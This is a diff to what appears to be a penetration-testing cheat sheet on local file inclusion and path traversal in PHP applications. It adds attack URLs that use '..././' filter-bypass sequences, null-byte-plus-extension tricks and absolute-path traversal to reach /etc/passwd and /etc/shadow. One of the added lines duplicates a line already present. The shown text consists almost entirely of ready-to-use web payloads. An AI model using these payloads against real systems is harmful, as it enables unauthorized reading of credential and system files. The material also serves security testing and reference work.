@@ -13,6 +13,7 @@
 ```
 http://example.com/index.php?page=../../../etc/passwd
 http://example.com/index.php?page=../../../../../../../../../../../../etc/shadow
+http://example.com/index.php?page=..././..././..././..././..././etc/shadow
 ```
 
 2. URL encoding
@@ -37,6 +38,7 @@ http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/pas
 
 ```
 http://example.com/index.php?page=../../../etc/passwd%00
+http://example.com/index.php?page=../../../etc/passwd%00.png #any (jpg...etc) 
 ```
 
 6. From an existent folder
@@ -50,6 +52,8 @@ http://example.com/index.php?page=scripts/../../../../../etc/passwd
 ```
 http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
 http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
+http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
+http://example.com/index.php?page=/var/www/html/../../../etc/passwd
 ```
 
 8. Using PHP Wrappers: filter
